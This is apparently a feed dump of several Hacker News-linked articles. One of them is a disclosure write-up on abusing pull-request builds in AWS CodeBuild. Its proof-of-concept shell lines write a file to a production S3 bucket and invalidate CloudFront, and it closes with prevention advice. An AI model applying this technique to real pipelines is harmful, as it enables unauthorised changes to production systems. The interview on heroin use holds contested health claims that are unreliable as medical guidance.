Score 277 | Comments 651 (<a href="https://news.ycombinator.com/item?id=26179003">thread link</a>) | @CapitalistCartr
<br/>
February 18, 2021 | http://m.nautil.us/issue/96/rewired/i-am-a-heroin-user-i-do-not-have-a-drug-problem | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/96/rewired/i-am-a-heroin-user-i-do-not-have-a-drug-problem">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>C</span>arl Hart is a neuroscientist and Ziff Professor of Psychology at Columbia University‚Äîhe was the first tenured African-American professor of sciences at Columbia. His research focuses on the ‚Äúbehavioral and neuropharmacological effects of psychoactive drugs in humans.‚Äù Hart‚Äôs new book, <i>Drug Use For Grown-Ups</i>, is a bold and engaging effort to counter what he sees as generations of misinformation and moral grandstanding about drug use. Today‚Äôs ‚Äúsensationalistic media coverage of the opioid crisis continues a long, awful tradition of exploiting ignorance and fear to vilify certain members of our society,‚Äù Hart writes. The media is not the only problem. Scientists, he states, ‚Äúhave frequently overinterpreted and distorted‚Äù drugs‚Äô effects on the brain.</p><p>Hart reports that more than 70 percent of drug users‚Äîwhether they use alcohol, cocaine, prescription medications, or heroin‚Äîdo not meet the health criteria for drug addiction. In <i>Drug Use for Grown-Ups</i>, Hart strives to ‚Äúpresent a more realistic image of the typical drug user: a responsible professional who happens to use drugs in his pursuit of happiness.‚Äù With genial candor, Hart presents himself as a model drug user. ‚ÄúI am now entering my fifth year as a regular heroin user,‚Äù he writes. ‚ÄúI do not have a drug-use problem. Never have. Each day, I meet my parental, personal, and professional responsibilities. I pay my taxes, serve as a volunteer in my community on a regular basis, and contribute to the global community as an informed and engaged citizen. I am better for my drug use.‚Äù</p><p><i>Nautilus</i> caught up with Hart to discuss his drug use and his sharp points about science and society. He was as casually bold in conversation as he is in <i>Drug Use for Grown-Ups</i>.</p><figure data-alt="MacNamara_BREAKER"><img src="http://static.nautil.us/18174_0f004440ba0c8f1ccc5c355f3d77207f.png" width="733" alt=""><figcaption><span><strong>HABIT OF A HIGHLY EFFECTIVE PERSON:</strong> ‚ÄúMy heroin use is as rational as my alcohol use,‚Äù Carl Hart writes. ‚ÄúLike vacation, sex, and the arts, heroin is one of the tools that I use to maintain my work-life balance.‚Äù</span><span>Courtesy of Carl Hart</span></figcaption></figure><p><b>You say ‚Äúmost drug-use scenarios cause little or no harm and that some responsible drug-use scenarios are actually beneficial for human health and functioning.‚Äù How so?</b></p><p>Let‚Äôs just talk about alcohol first. When you‚Äôre at a wedding reception, alcohol serves as a social lubricant. People are more gregarious. They talk, they interact. The same is true with cocaine at parties, heroin among friends, or opium among friends, NDMA among lovers. It enhances empathy, openness, and forgiveness, all of these pro-social attributes.</p><p><b>Drug research, you write, is full of bad science. If you had to name one example, what would it be?</b></p><p>The notion that drug addiction is a brain disease. That encapsulates all that‚Äôs wrong with today‚Äôs science in this area. There is absolutely no data in humans to show that drug addiction is a brain disease. Yet the narrative, the dogma, the dominant perspective is that it does. Even though nobody will dispute that, there‚Äôs absolutely no data in humans to support that statement.</p><p><b>Yet opioids do change the brain biologically, do they not?</b></p><p>Yes, opioids bind to a class of receptors called endogenous opioids, which you find in endorphins, for example. Opioids bind to these receptors‚Äîjust like natural chemicals do‚Äîwhich results in a response. In some cases, because of decreased sensitivities and certain types of pain, they may enhance a sense of euphoria. So it‚Äôs really just facilitating what‚Äôs already in the body naturally, a system that helps in our survival. Think of fructose or glucose. We add sugar to our tea, our coffee, whatever we have, we add more and more because we like it, it tastes good, and it enhances pleasure. It can give you energy. It can make life more interesting. Humans do not live on logic alone. And so sometimes we do these things, and that‚Äôs OK.</p><blockquote><p>People become addicted because they once had a middle-class-paying job that made them someone in their community.</p> </blockquote><p><b>How have scientists ‚Äúoverinterpreted and distorted‚Äù the effects of drugs on the brain?</b><br></p><p>Take brain imaging. People often show one image of someone‚Äôs brain. Let‚Äôs say this person is addicted to methamphetamine, according to DSM criteria, versus the brain of someone who‚Äôs not addicted. If you see some difference, some researchers have a propensity to make more out of the differences than are there. There‚Äôs a wide range of brain structural sizes, such that when we think about one person‚Äôs size of their nucleus accumbens, it may be smaller or larger than somebody else‚Äôs nucleus accumbens. But both of the nucleus accumbens, despite their sizes, are within the normal range of human variability. It‚Äôs like height. One guy might be 5‚Äô10‚Äù, another guy might be 6‚Äô2‚Äù. But we don‚Äôt say the guy who‚Äôs 5‚Äô10‚Äù is height deficient. We just say that he‚Äôs in a normal range, and he‚Äôs not as tall as the other guy. We wouldn‚Äôt say one is deficient versus the other. In neuroscience, one of the things that has happened, particularly when it comes to drugs, people have over-interpreted the differences to mean pathology, when, in fact, both of the brain structures are within the normal range of human variability. The overinterpretation is to interpret it as being pathological.</p><p><b>You say the opioid crisis has been sensationalized, and write, ‚ÄúPeople are not dying because of opioids; they are dying because of ignorance.‚Äù What do you mean?</b></p><p>Some people don‚Äôt know not to mix specific sedatives with opioids. For example, they don‚Äôt know not to mix large amounts of alcohol or large amounts of antihistamines. Specific combinations can lead to respiratory depression, which can lead to death. Another point of ignorance involves people who buy street drugs and don‚Äôt necessarily know if the drugs contain contaminants. That‚Äôs the kind of ignorance I‚Äôm talking about.</p><div>
<article>
<p><a href="http://m.nautil.us/issue/94/Evolving/outwitting-the-grim-reaper" data-trval="outwitting-the-grim-reaper" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/18030_231182acb75cdce3350df92d900c7f91.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Neuroscience">Also in Neuroscience</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/94/Evolving/outwitting-the-grim-reaper" data-trval="outwitting-the-grim-reaper" data-trlbl="foc_rec" data-tract="internal_art">Outwitting the Grim Reaper</a></h4>
<p>By Kevin Berger</p>
<p>
Some evolutionary biologists say that after we pass reproductive age, nature, like a cat who‚Äôs been fed, is done with us. The bodily systems that thrived and repaired themselves to ensure that we pass on healthy genes cease to function...<strong><a href="http://m.nautil.us/issue/94/Evolving/outwitting-the-grim-reaper" data-trval="outwitting-the-grim-reaper" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div><p><b>So it‚Äôs the mix of drugs that is the problem, not opioids like heroin themselves?&nbsp;</b></p><p>Yes, the majority of opioid deaths occur as a result of combining opioids with multiple sedatives. But there are certain opioids that do concern us if taken alone and the person isn‚Äôt aware that they have this particular opioid. Those are fentanyl and the fentanyl analogs. These drugs are a lot more potent than something like heroin, meaning they require less of it to produce the effect. Most of the public aren‚Äôt seeking fentanyl or its analogs, but people are tainting things like heroin and oxycodone pills with fentanyl or an analog.</p><p>One way to deal with this tainting, this contamination, is to have free drug-checking facilities, where people can submit samples of their drug and get a chemical readout of what is contained in the substance. That way they‚Äôll know whether to take the substance or how much of it to take. The public also needs to know that most people who use these drugs are not addicts. If you understand that, then you know that for the people who do become addicted, we have to look beyond the drug and look at the person‚Äôs environment, their life. Do they have co-occurring psychiatric illnesses? Do they have pain that is not treated? All of these kinds of issues become important.</p><p><b>At what point does biological change in the brain lead to physical addiction?</b></p><p>Physical addiction occurs as a result of opioids‚Äîor any other drug, alcohol too‚Äîbeing in the body for consecutive weeks or periods, in particularly high doses. And then the body tries to compensate. For example, with opioids, one of the things that happens is that your gut, your gastrointestinal system, slows down the receptors. Your body is trying to compensate by speeding up the gastrointestinal tract. So when the drug abruptly leaves after several weeks of constant administration of the opioid, now the body is unprepared for the drug not being there and it overcompensates. It really ramps up the motility of the gastrointestinal tract, which causes diarrhea, among other things.</p><blockquote><p>It can give you energy. It can make life more interesting. Humans do not live on logic alone.</p> </blockquote><p><b>Why do some people get addicted and not others?</b><br></p><p>The amount of drugs they take, the period at which they take it. Some people can take opioids for extended periods of time. As long as they keep the doses fairly low and they don‚Äôt take multiple doses a day, they probably won‚Äôt experience physical dependence. It‚Äôs just like with alcohol. Most people drink alcohol on a regular basis, but they don‚Äôt become physically dependent. Whereas others drink every day in large amounts, and they will become physically dependent.</p><p><b>Why can‚Äôt people overcome addiction?</b></p><p>One of the major reasons people can‚Äôt overcome it is because we‚Äôre not very good at treating addiction in this country. Just think about why people become addicted. A large number become addicted because of co-occurring psychiatric illnesses, because of pain issues, because they once had a middle-class-paying job that made them someone in their home, someone in their community. Those jobs are gone. Then there‚Äôs no healthcare or there‚Äôs poor education. If your treatment is not addressing these issues, people are not going to overcome it. But if we have treatments that are holistic, and they‚Äôre looking at the individual, and not so much the drug, then we‚Äôre good. But if we‚Äôre just talking about the drug, then we‚Äôre already behind the eight ball, then we will lose that battle.</p><p><b>Your definition of addiction follows the DSM-5, which refers to a ‚Äúsubstance use disorder‚Äù and values functioning over regular ingestion of a substance. How do you define ‚Äúfunctioning‚Äù?</b></p><p>Functioning is determined by whether a user is happy in meeting their obligations, whatever they may be, whether they‚Äôre work-related, whether they‚Äôre family-related, or other social sorts of things. The person is not stressed out about their substance use. In ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/96/rewired/i-am-a-heroin-user-i-do-not-have-a-drug-problem">http://m.nautil.us/issue/96/rewired/i-am-a-heroin-user-i-do-not-have-a-drug-problem</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/96/rewired/i-am-a-heroin-user-i-do-not-have-a-drug-problem</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179003</guid>
            <pubDate>Thu, 18 Feb 2021 12:23:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Danish Immigration Policies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179000">thread link</a>) | @HaoZeke
<br/>
February 18, 2021 | https://www.thelocal.dk/20210216/denmark-imprisons-international-student-at-migrant-facility-after-visa-overstay | <a href="https://web.archive.org/web/*/https://www.thelocal.dk/20210216/denmark-imprisons-international-student-at-migrant-facility-after-visa-overstay">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.thelocal.dk/20210216/denmark-imprisons-international-student-at-migrant-facility-after-visa-overstay</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179000</guid>
            <pubDate>Thu, 18 Feb 2021 12:23:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build Pipeline Security]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26178756">thread link</a>) | @oxinabox
<br/>
February 18, 2021 | https://sprocketfox.io/xssfox/2021/01/18/pipeline/ | <a href="https://web.archive.org/web/*/https://sprocketfox.io/xssfox/2021/01/18/pipeline/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
      
  <p><em>This occurred on an AWS website (not a site hosted on AWS, but a site run by AWS). It shows that security is hard, even for a $51 billion business. This issue can occur not just on websites but even SDKs and libraries</em></p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/erik-mclean-TNjdgCBRMeU-unsplash.jpg" alt="Fox smelling the road"></p>
<blockquote>
<p>üì∏ Erik Mclean via unsplash</p>
</blockquote>
<p>While developers have a keen nose for <a href="https://en.wikipedia.org/wiki/Code_smell">code smells</a> us operations types have a keen nose for infrastructure smells. When I opened this git repository for first time it hit me. A <code>buildspec.yml</code> file.</p>
<h3 id="the-humble-buildspecyml">The humble <code>buildspec.yml</code></h3>
<p>For those unfamiliar, <code>buildspec.yml</code> is used by a service called <a href="https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html">CodeBuild</a> and basically defines the steps used to build a project, including running shell commands. It‚Äôs basically remote code execution as a service.</p>
<p>The presence of this file in a repository isn‚Äôt call for alarm, but when it‚Äôs in a public repository it certainly raises red flags. The usual concern is someones committed some secret credentials into this file. In this case the file was clean of credentials.</p>
<p>All good right? Not so fast.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/lachlan-gowen-cWwqwN2uTo4-unsplash.jpg" alt="Fox sleeping"></p>
<blockquote>
<p>üì∏ Lachlan Gowen via unsplash</p>
</blockquote>
<h3 id="notices-your-deploysh"><em>notices your <code>deploy.sh</code></em></h3>
<p>The <code>buildspec.yml</code> referenced a <code>deploy.sh</code>. This is when I verbally said ‚Äúoh no‚Äù. Like before no secrets committed. A good start. <code>deploy.sh</code> contains instructions to deploy out the project - like <code>aws s3 sync</code> and the like, so we can determine that when this gets run it has access to upload to the production site.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/nathan-anderson-3Lazy6QQR6c-unsplash.jpg" alt="Fox yelling"></p>
<blockquote>
<p>üì∏ Nathan Anderson via unsplash</p>
</blockquote>
<p>The issue here is that the <code>buildspec.yml</code> and <code>deploy.sh</code> could be modified by a malicious user.</p>
<h3 id="the-pull-request">The pull request</h3>
<p>However malicious user doesn‚Äôt have access to commit to the repository and an admin isn‚Äôt going to merge malicious code, so this is no big deal right? Let‚Äôs see what happens when we lodge a pull request.</p>
<p>Upon creation of the pull request GitHub triggers a CodeBuild job. This is a fairly common practice to make sure nothing in the pull request breaks the build. What prevents the pull request build from deploying to production? Lets check <code>deploy.sh</code></p>
<div><pre><code data-lang="sh"><span>if</span> <span>[[</span> <span>"</span>$CODEBUILD_WEBHOOK_HEAD_REF<span>"</span> <span>==</span> <span>"refs/heads/main"</span> <span>&amp;&amp;</span> <span>${</span>CODEBUILD_SOURCE_VERSION:0:3<span>}</span> !<span>=</span> <span>"pr/"</span> <span>]]</span>; <span>then</span>
</code></pre></div><p>oh no.</p>
<p>So deployment is purely controlled by a script that can be changed in the pull request.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/scott-walsh-7LzKELgdzzI-unsplash.jpg" alt="Fox in grass"></p>
<blockquote>
<p>üì∏ Scott Walsh via unsplash</p>
</blockquote>
<h3 id="one-last-chance">One last chance</h3>
<p>At this stage we‚Äôve got remote code execution into the pipeline. Apart from <a href="https://www.vice.com/en/article/nzkxgm/bitcoin-mining-github-open-source-bots">mining some Bitcoin</a> this is pretty uneventful. What about the S3 sync we mentioned earlier? It‚Äôs possible that the role granted for pull requests is the same role used for deploying to production, so lets check it out.</p>
<p>I edited the shell script to have my code right at the start ‚Ä¶</p>
<div><pre><code data-lang="sh">echo <span>"testing a security issue"</span> &gt; test.html
aws s3 cp test.html s3://target_bucket/test.html
aws cloudfront create-invalidation --distribution-id $CLOUDFRONT_DIST_ID --paths <span>"/*"</span>
exit <span>1</span>
</code></pre></div><blockquote>
<p><code>target_bucket</code> value was recovered from original <code>deploy.sh</code></p>
</blockquote>
<p>‚Ä¶ and lodged a pull request. I checked the website and sure enough my file was there. üòÆ</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/nathan-anderson-XHK0JdmJxJc-unsplash.jpg" alt="Fox licking lips"></p>
<blockquote>
<p>üì∏ Nathan Anderson via unsplash</p>
</blockquote>
<h3 id="it-doesnt-end-there">It doesn‚Äôt end there</h3>
<p>It‚Äôs quite possible that the role used for deployment might have access to lots of interesting things, a private subnet, IAM admin, CloudFormation. I didn‚Äôt check further than this and submitted a disclosure reported to the security team immediately.</p>
<h3 id="prevention">Prevention</h3>
<p>If you still want pull requests to trigger builds on a public repository there a couple of things you can do to limit risk.</p>
<p>Place build scripts in a separate repo. Some build tools let you specify a separate repo to use for the build pipeline. Be careful though as this doesn‚Äôt guarantee that the project build can‚Äôt execute commands, depending on the programming language and build tools.</p>
<p>For services like CodeBuild you can utilize a separate IAM role for pull requests which is limited to just build requirements. Make sure the build agents for PRs aren‚Äôt within a a trusted network.</p>




      
        
      
    </article>
    
    
      

    
  </div></div>]]>
            </description>
            <link>https://sprocketfox.io/xssfox/2021/01/18/pipeline/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178756</guid>
            <pubDate>Thu, 18 Feb 2021 11:50:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Andy Warhol Museum Amiga Exhibit ‚Äì Iontank]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26178729">thread link</a>) | @rbanffy
<br/>
February 18, 2021 | https://www.iontank.com/projects/warhol-amiga | <a href="https://web.archive.org/web/*/https://www.iontank.com/projects/warhol-amiga">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
        How does one reliably display digital artwork originally created by Andy Warhol on the Amiga 1000 in the 80s? This was the challenge laid out for Iontank by The Andy Warhol Museum after Cory Arcangel and a team from Carnegie Mellon University‚Äôs Computer Club successfully recovered digital Warhol images from floppy disks that had gone overlooked in the museum‚Äôs archives. <p> Iontank proposed creating Amiga replicas out of decommissioned Amiga 1000s. All internal components were replaced with new solid-state hardware so the units would be more stable as they toured the globe, but Iontank also took great care to restore and integrate the original mice and keyboards so they would work with the new systems. Even the lights on the monitor and case illuminate as intended. </p><p> Replacements for the antique CRT screens were also prototyped. Promising projection tests were ultimately abandoned in favor of an industrial LCD screen, but it still lacked the dimensionality of a CRT. The solution was for Iontank to mill a clear acrylic lens that mated perfectly with the original monitor housing and matched the original screen curvature. To complete the illusion, Iontank created a custom Amiga 1000 emulator and file system to allow users to explore the images themselves. The emulator even recreated the slow disk access and lag of the beloved Amiga.</p><p> A second version of the Warhol Amiga system was also commissioned that allows users to experiment with a simulation of the GraphiCraft application Warhol had used. This Amiga lets visitors capture images using a digital camera and try their hand at creating Warhol-inspired artworks of their own.
      </p></span>
    </p></div>]]>
            </description>
            <link>https://www.iontank.com/projects/warhol-amiga</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178729</guid>
            <pubDate>Thu, 18 Feb 2021 11:45:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Why of Technology]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26178726">thread link</a>) | @mpereira
<br/>
February 18, 2021 | https://www.murilopereira.com/the-why-of-technology/ | <a href="https://web.archive.org/web/*/https://www.murilopereira.com/the-why-of-technology/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://www.murilopereira.com/man_on_a_bicycle.jpg"></figure><blockquote><p>I think one of the things that really separates us from the high primates
is that we‚Äôre tool builders. I read a study that measured the efficiency of
locomotion for various species on the planet. The condor used the least
energy to move a kilometer. Humans came in with a rather unimpressive
showing about a third of the way down the list. It was not too proud a
showing for the crown of creation. So, that didn‚Äôt look so good.</p><p>But then, somebody at Scientific American had the insight to test the
efficiency of locomotion for a man on a bicycle. And, a man on a bicycle, a
human on a bicycle, blew the condor away, completely off the top of the
charts.</p><p>And that‚Äôs what a computer is to me. What a computer is to me is it‚Äôs the
most remarkable tool that we‚Äôve ever come up with.</p><p>It‚Äôs the equivalent of a bicycle for our minds.</p><p>‚Äî <a href="https://www.youtube.com/watch?v=0lvMgMrNDlg&amp;feature=youtu.be&amp;t=322">Steve Jobs (1980)</a></p></blockquote><p>* * *</p><p><a href="https://www.it-hiroshima.ac.jp/institution/library/pdf/research52%5F007-013.pdf">No one knows</a> when or how we, the human species, started talking to each
other. It is likely a natural progression from gesturing, but we can only
speculate about it.</p><p>Language allowed us to break out of our brains and reveal the inner
workings of our consciousness to others.</p><figure><img src="https://www.murilopereira.com/language_speech.jpg" alt="Figure 2: Scott H. Young"><figcaption><p>Figure 2: <a href="https://www.scotthyoung.com/blog/2018/12/04/25-thinking-tools/">Scott H. Young</a></p></figcaption></figure><p>Language is the vessel that carried us from the stone age through the
agricultural revolution, the development of written language, the
scientific and industrial revolutions, and now, the digital age.</p><p>Writing allowed us to <em>offload</em> memories to the physical world‚Äîoutside of
our brains. Through our collective and external memories, each generation
has a head start on the previous one. Little by little, standing on the
shoulders of taller and taller giants, we accumulate knowledge about
ourselves and everything around us.</p><p>We‚Äôve been for long using tools to help us think: notebooks help us
calculate formulas, reason geometrically and preserve our ideas. With
computers, our <em>thinking</em> is now occurring outside of our brains.</p><p>Computers are extensions of our minds in that they allow us to store,
process, and retrieve information from them. With the advent of the
internet we now have immediate access to not only almost all of the
information ever produced by humankind but also to reproducible <em>thinking</em>
encoded into these machines: algorithms.</p><p>Our brain is still a much more impressive device than any of today's
computers. Computers learn
<a href="https://www.davidsilver.uk/wp-content/uploads/2020/03/nfsp-1.pdf">mostly</a>
by finding patterns in massive
quantities of examples given by us. Teaching a young kid about cars‚Äîhow
to recognize one, what they are, what their purpose is, and how they're
related to other things‚Äîrequires little supervision. Noam Chomsky talks
about it in
<a href="https://www.youtube.com/watch?v=hdUbIlwHRkY&amp;t=1462">this interview</a>.</p><p>Each of these processes‚Äîstoring, processing and retrieving
information‚Äîhave concrete effects on the physical world: if I‚Äôm in
Munich, saying ‚Äúshow route to Hamburg‚Äù to my phone will immediately show me
the distance, ETAs and paths for different types of transport to reach my
destination. Not only do I now suddenly know how to navigate across the
country to reach another city, I‚Äôm also able to follow through the exact
path via GPS‚Äîa sixth sense giving me perfect geolocation!</p><p>These <em>things</em> that we created‚Äîcomputers, and the internet‚Äîare literally
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6502424/">rewiring our brains</a>, right now, shaping how we think, and engage in social
relationships, changing not only our individual selves but the societies we
live in.</p><p>They started as mechanical machines that filled entire laboratories, turned
into beige boxes in our homes and places of work, and are now sleek slabs
of plastic, metal and glass in everyone‚Äôs pockets. Step by step they get
closer to our bodies, their interfaces more intuitive and natural.</p><p>The way we communicate with them is changing: before, we could only
interact with them by speaking their language. We have now taught them
ours. The torch of progress blazes on: it‚Äôs a matter of <em>time</em> until they‚Äôre
connected directly with our brains‚Äîwhich is equally terrifying and
awe-inspiring.</p><figure><img src="https://www.murilopereira.com/neuralink.jpg" alt="Figure 3: Neuralink"><figcaption><p>Figure 3: <a href="https://neuralink.com/">Neuralink</a></p></figcaption></figure><p>Brain-computer interfaces present a monumental scientific and engineering
challenge, and brain-to-brain, a whole other category of difficulty.</p><p>First, we have no idea how information is encoded in the brain. That needs
to be understood. Second, even assuming we‚Äôre able to take a perfect
snapshot of a piece of information in someone‚Äôs brain‚Äîfor example, how a
particular movie scene makes them feel‚Äîwe still need to be able to encode
it in a way that includes the full context of their subjective experiences.
Maybe the scene evokes unique memories of their childhood or is somehow
entangled with the smell of a particular cinema‚Äôs leather seats. Third, we
need to figure out how to safely write this perfect snapshot into someone
else‚Äôs brain in a way that can be perceived identically.</p><p>Which is to say, it‚Äôs a difficult problem. But a worthwhile one: imagine
having the capability to suddenly become aware of answers for questions you
just thought about. To expertly control <a href="https://youtu.be/PLk8Pm%5FXBJE?t=13">truly integrated</a> prosthetics giving
you superhuman abilities. To give movement to the paralized, sound to the
deaf, and sight to the blind.</p><p>What would be the impacts on society if we were able to communicate an
order of magnitude more effectively? What if <em>everyone</em> was equipped with
the same undisputed basic knowledge of history and science?</p><p>There are internal thoughts that we can attempt to describe with a thousand
words, but ultimately fail to capture in a way that‚Äôs precise, much less
comprehensible by someone else. Words and sentences are an incomplete
representation of our internal thoughts. In the same way that 3D objects
cast 2D shadows (<a href="https://www.youtube.com/watch?v=N0WjV6MmCyM">and 4D, 3D</a>) communicating through language doesn‚Äôt carry
all of our cultural and developmental context‚Äîtransmitting all of that
along with every phrase would be impractical. Language is in this sense,
lossily compressed thought.</p><figure><img src="https://www.murilopereira.com/tesseract_shadow.jpg"></figure><p>Inert strings of words of ink and paper take a life of their own inside our
heads. It‚Äôs why the exact same information can be interpreted completely
differently by different people.</p><p>Before language, fire and cooking technology allowed us to reallocate
energy usage from the digestive system to the brain by outsourcing
digestion to outside of our bodies, making macronutrients more efficiently
absorbable. Almost all of a cooked meal is metabolized by the body, whereas
raw foods yield less than half of their nutrients.</p><p>Cooking is an extension of our digestive system, and enabled us to develop
large, calorie-hungry brains. It also gave us time to think: our primate
cousins spend half of their days chewing raw food to consume enough
calories to stay alive.</p><p>Brains can be seen as <em>survival machines</em>, locked inside dark skulls,
constantly building a model of the outside world by predicting and learning
through senses and memory. The biological human brain evolved to have the
necessary sophistication to not only expertly navigate and understand the
brute physical reality but also to construct <em>social</em> reality. Democracy,
religion, money: all made up by us, for us.</p><p>We remember the past so that we can predict the future, and by doing so, we
thrive.</p><p>We create technology, which functions as a non-biological extra layer to
our brains and bodies, augmenting, complementing, and sometimes replacing
our natural capabilities.</p><blockquote><p>The wheel‚Ä¶ is an extension of the foot.</p><p>The book‚Ä¶ is an extension of the eye‚Ä¶</p><p>Clothing, an extension of the skin‚Ä¶</p><p>Electric circuitry, an extension of the central nervous system.</p><p>‚Äî
<a href="https://en.wikipedia.org/wiki/Understanding_Media">Understanding Media: The Extensions of Man (1964)</a></p></blockquote><p>Relatively speaking, we are done evolving <em>biologically</em>. Further adaptations
and enhancements to our bodies and minds will come through technology.</p><figure><img src="https://www.murilopereira.com/brain_layers.jpg" alt="Figure 5: Check out &amp;ldquo;Neuralink and the Brain&amp;rsquo;s Magical Future&amp;rdquo; for a very entertaining primer on the brain."><figcaption><p>Figure 5: Check out ‚Äú<a href="https://waitbutwhy.com/2017/04/neuralink.html">Neuralink and the Brain‚Äôs Magical Future</a>‚Äù for a very entertaining primer on the brain.</p></figcaption></figure><p>To be human is to have the ability to change the world around us. The shift
from hunting and gathering to farming allowed us to spend less energy to
acquire food while giving us a predictable calorie supply.</p><p>The resulting food surplus made it possible for populations to settle down
and grow quickly while supporting people not being directly involved in the
production of food‚Äîbefore agriculture that was everyone‚Äôs job. For one,
it allowed some to specialize and focus on developing better farming tools
and more resistant crops, starting a vicious cycle of improvement and
consumption that continues until today.</p><p>The transition from active foraging to a more sedentary lifestyle resulted
in worse health for the general population. The average farmer worked
harder than the average forager and got a worse diet in return. Our teeth,
bones and joints became more fragile, and we became afflicted by novel
diseases coming from newly domesticated animals, carriers of pathogens that
incubated in our new densely populated cities.</p><p>Owning land suddenly became really important. Agriculture and the concept
of private property reinforced each other and grew together, allowing us to
create value and secure the fruits of our labor. It also created the
circumstances for slavery to arise, and wars to be waged.</p><p>The groups of people growing the first crops could not have anticipated all
of the collateral effects of their breakthrough. They just wanted more
food.</p><p>If the past has taught us anything is that we have to be mindful of the
consequences of our progress. In an increasingly connected world, change is
often <a href="https://hbr.org/2017/05/linear-thinking-in-a-nonlinear-world">nonlinear</a> and unpredictable. Cars didn‚Äôt just replace horses‚Äîthey
forever changed the entire outlook of every city. Did Tim Berners-Lee
anticipate his invention adding to forces pulling whole countries apart?</p><p>Our progress will continue to bring us previously unimaginable challenges.
Against an unknowable future, it doesn‚Äôt hurt to keep improving our
capabilities to adapt and, more difficultly, to cooperate‚Äîespecially at
scale.</p><figure><img src="https://www.murilopereira.com/humanity.jpg" alt="Figure 6: &amp;ldquo;Humanity&amp;rdquo; by Pawel Kuczynski"><figcaption><p>Figure 6: ‚Äú<a href="https://www.pictorem.com/24592/humanity.html">Humanity</a>‚Äù by Pawel Kuczynski</p></figcaption></figure><p>Computers are getting pretty good at driving cars‚Äîeven in the most
difficult situations‚Äîand can already instantly diagnose some diseases
better than human doctors. Technology has a way to <a href="https://www.thenewatlantis.com/publications/understanding-heidegger-on-technology">reveal</a> the potential of
our environment, and ourselves. We have to be careful not to look at ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.murilopereira.com/the-why-of-technology/">https://www.murilopereira.com/the-why-of-technology/</a></em></p>]]>
            </description>
            <link>https://www.murilopereira.com/the-why-of-technology/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178726</guid>
            <pubDate>Thu, 18 Feb 2021 11:45:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An assessment of four bullet point styles for a technical resume]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26178714">thread link</a>) | @mcenedella
<br/>
February 18, 2021 | https://leetresumes.com/blog/an-assessment-of-four-bullet-point-styles-for-a-technical-resume | <a href="https://web.archive.org/web/*/https://leetresumes.com/blog/an-assessment-of-four-bullet-point-styles-for-a-technical-resume">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>Perhaps 2/3 of a <a href="https://leetresumes.com/blog/how-to-write-a-great-technical-resume">great technical resume</a> is composed of bullet points. For most professionals, summarizing your career in just 10 - 25 bullet points feels overwhelming. With a little guidance, and by focusing on what's most important, however, it's pretty easy to get it right. </p><p>Let's review the best approach to populating the bullets on a technical resume, and demonstrate how Leet Resumes handles bullets when we <a href="https://leetresumes.com/">write technical resumes for experienced technology professionals for free</a>.</p><h2>Bullet Points Should Emphasize Your Achievements</h2><p>A resume is a document about your career.  It does not touch on your family life, hobbies, friendships, or religion. As a commercial document, with a commercial purpose, a resume's goal is to help you generate interview requests. Whether you're applying to a job, or passing along your resume for consideration by a friend, its goal is to communicate an effective, shorthand version of your career that causes the people who hire to say "yes, let's bring them in for an interview!"</p><p>The best way to generate these interview requests is to appeal to your future boss' or hiring manager‚Äôs need to <a href="https://leetresumes.com/blog/why-you-should-include-numbers-on-your-technical-resume">solve a problem</a>. And the best way to demonstrate your ability to solve problems is to write effective bullet points that use <a href="https://leetresumes.com/blog/practical-methods-for-adding-more-numbers-to-your-technical-resume">numbers</a> to quantify your accomplishments. Quantified accomplishments are superior to opinion-based accomplishments, catch the recruiter's eye more easily, and set you apart from the other resumes in the stack.</p><p>Let‚Äôs review some different types of bullet points commonly seen on technical resumes.</p><h2>Bullet Point Styles on Technical Resumes</h2><h3>Event-based</h3><ul><li>Developed</li><li>Shipped</li><li>Re-architected</li><li>Migrated</li><li>Launched</li><li>Refactored </li></ul><p>Most technical resumes default to 